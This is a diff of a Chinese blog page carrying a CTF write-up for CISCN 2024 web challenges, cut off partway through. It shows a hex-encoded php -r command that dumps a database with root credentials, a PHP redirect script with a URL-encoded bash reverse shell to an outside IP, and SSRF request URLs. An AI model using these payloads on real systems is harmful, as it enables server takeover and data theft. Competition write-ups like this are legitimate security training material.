@@ -13,19 +13,23 @@
 <meta property="og:site_name" content="Jasper_sec">
 <meta property="og:description" content="前言所有事情看得太清楚，或许不是件好事，我好像变弱了。 simple_php用php -r 执行php代码，用hex2bin绕过关键字和转义。 1cmd&#x3D;php+-r+eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250441957.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250442616.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430802.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250442181.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250443151.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430804.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250435029.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250436448.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430805.png">
 <meta property="article:published_time" content="2024-05-24T20:31:00.000Z">
-<meta property="article:modified_time" content="2024-05-24T20:40:03.550Z">
+<meta property="article:modified_time" content="2024-05-24T20:45:26.643Z">
 <meta property="article:author" content="Jasper_sec">
 <meta property="article:tag" content="Java">
 <meta property="article:tag" content="反序列化">
 <meta property="article:tag" content="复现">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430802.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250441957.png">
     
     
       
@@ -150,7 +154,7 @@
       
         <time datetime="2024-05-24T20:31:00.000Z" class="dt-published" itemprop="datePublished">2024-05-25</time>
         
-        (Updated: <time datetime="2024-05-24T20:40:03.550Z" class="dt-updated" itemprop="dateModified">2024-05-25</time>)
+        (Updated: <time datetime="2024-05-24T20:45:26.643Z" class="dt-updated" itemprop="dateModified">2024-05-25</time>)
         
       
     </div>
@@ -174,54 +178,22 @@
 <h1 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h1><p>用php -r 执行php代码，用hex2bin绕过关键字和转义。</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php+-r+eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b,1)));</span><br></pre></td></tr></table></figure>
 
-<figure>
-<img
-src="CISCN%202024%20check-media/21f60c0cef191157903d348200b93bb6ae5b38b2.png"
-title="wikilink" alt="Pastedimage20240518131437.png" />
-<figcaption
-aria-hidden="true">Pastedimage20240518131437.png</figcaption>
-</figure>
-
-
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250441957.png" alt="image-20240525044153901"></p>
 <h1 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h1><p>生成二维码的接口可以打ssrf，打302跳转进ssrf，参考下面的链接：<br><a target="_blank" rel="noopener" href="https://zone.huoxian.cn/d/392-302-ssrfhttp">利用302跳转绕过限制-ssrf仅能使用http协议时 - 火线 Zone-安全攻防社区 (huoxian.cn)</a></p>
 <p>vps上用php -S 0.0.0.0:8080 起一个http服务，写上跳转脚本，利用题目自带的后门反弹shell</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://127.0.0.1/flag.php?cmd=%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%31%36%2e%36%32%2e%33%38%2e%37%31%2f%39%39%39%39%20%30%3e%26%31%22&#x27;</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
 
 <p>利用接口访问vps，利用302跳转反弹shell拿到flag</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2zecvr9tqvox55jeytq8.cloudeci1.ichunqiu.com/?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://38.165.38.101:8080/index.php&amp;size=10&amp;level=1</span><br></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2zecvr9tqvox55jeytq8.cloudeci1.ichunqiu.com/?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://xx.xx.xx.xx/index.php&amp;size=10&amp;level=1</span><br></pre></td></tr></table></figure>
 
-<figure>
-<img
-src="CISCN%202024%20check-media/2b3f4c3a960ceb852fe74eef4519c172d965f13e.png"
-title="wikilink" alt="Pastedimage20240518161001.png" />
-<figcaption
-aria-hidden="true">Pastedimage20240518161001.png</figcaption>
-</figure>
-
-
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250442616.png" alt="image-20240525044216568"></p>
 <h1 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h1><p>getimagesize 那里对$thumb的文件类型有要求<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430802.png" alt="Pasted image 20240522084222.png" title="wikilink"></p>
 <p>我们加一个图片头绕过一下就好了，这里有点坑，要多加几个</p>
-<figure>
-<img
-src="CISCN%202024%20check-media/f4222214a4477c41bbb67a7a3f036edeb28d710b.png"
-title="wikilink" alt="Pastedimage20240522084240.png" />
-<figcaption
-aria-hidden="true">Pastedimage20240522084240.png</figcaption>
-</figure>
-
-
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250442181.png" alt="image-20240525044243126"></p>
 <p>payload区别不大，注意这里text不能重复，不然不会进代码逻辑</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?s=api&amp;c=api&amp;m=qrcode&amp;text=7777777777777&amp;thumb=http://116.62.38.71:8080/index.php&amp;size=10&amp;level=1</span><br></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?s=api&amp;c=api&amp;m=qrcode&amp;text=7777777777777&amp;thumb=http://xx.xx.xx.xx/index.php&amp;size=10&amp;level=1</span><br></pre></td></tr></table></figure>
 
-<figure>
-<img
-src="CISCN%202024%20check-media/7cf7519104585f285dbce638ba9a04d924276157.png"
-title="wikilink" alt="Pastedimage20240522084317.png" />
-<figcaption
-aria-hidden="true">Pastedimage20240522084317.png</figcaption>
-</figure>
-
-
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250443151.png" alt="image-20240525044331116"></p>
 <p>PS：上面的方法在比赛可以过，但是在ctfshow的靶场上是过不了的，复现的师傅注意一下。<br># ezjava</p>
 <p>这题有好几种解法，有db文件缓存、sql注入和AspectJWeaver反序列化写文件，下面用的缓存</p>
 <p>简单说一下整体思路：</p>
